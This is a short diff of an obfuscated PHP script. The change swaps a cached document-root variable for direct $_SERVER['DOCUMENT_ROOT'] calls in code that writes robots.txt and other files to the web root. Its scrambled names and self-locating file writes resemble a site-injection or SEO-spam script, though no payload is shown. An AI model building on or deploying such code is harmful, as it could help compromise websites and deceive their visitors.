@@ -161,7 +161,7 @@ $l1VtbCwB = "";
 $l1Vvtr = ".";
 $l1bS3es = $l1o7fR = $l1M = $l1EbALe = $l1h = $l1Z4k = $l1Ni6 = $l1VQ="";
 $l1T2 = $l1gfDiJL = $l1NhADdH = $l1h1 = $l135vXS = $l1bhL8Zi = $l1GH0rfZ = array();
-$l1I = $_SERVER["DOCUMENT_ROOT"];
+//$l1I = $_SERVER["DOCUMENT_ROOT"];
 
 /* Write file */
 function write_file($fname,$content='',$mode='w'){
@@ -764,7 +764,7 @@ function l1P9LVD($l15tGX=''){
     global $param1,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h;
     global $l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k;
 
-    write_robots_txt($l1I);
+    write_robots_txt($_SERVER["DOCUMENT_ROOT"]);
 
     /* Parse config */
     /*
@@ -857,11 +857,11 @@ function l1P9LVD($l15tGX=''){
     if($l1M == ''){
         $l1M = isset($_SERVER["SCRIPT_FILENAME"]) ? $_SERVER["SCRIPT_FILENAME"] : '';
         if($l1M != ''){
-            $l1M = str_replace($l1I,'',$l1M);
+            $l1M = str_replace($_SERVER["DOCUMENT_ROOT"],'',$l1M);
         }
     }
 
-    l1SU("$l1I$l1M,".__FILE__);
+    l1SU($_SERVER["DOCUMENT_ROOT"] . "$l1M," . __FILE__);
 
     if($l1M!=''){
         $l1M=substr($l1M,1);
